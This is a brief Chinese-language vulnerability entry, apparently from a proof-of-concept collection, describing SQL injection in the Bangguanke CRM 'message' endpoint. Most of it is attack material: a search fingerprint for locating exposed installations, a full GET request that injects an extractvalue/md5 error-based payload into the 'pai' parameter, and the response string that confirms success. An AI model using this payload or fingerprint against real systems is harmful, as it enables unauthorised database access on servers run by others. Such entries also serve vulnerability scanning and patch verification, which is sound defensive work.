# 帮管家CRM-message-SQL注入

帮管家CRM-message ｜ SQL注入 ｜ —
- **指纹**：`app="帮管客-CRM"`
- **请求**：`GET /index.php/message?page=1&pai=1%20and%20extractvalue(0x7e,concat(0x7e,(select%20md5(1)),0x7e))%23&xu=desc HTTP/1.1`
- **响应特征**：200 a0b923820dcc509a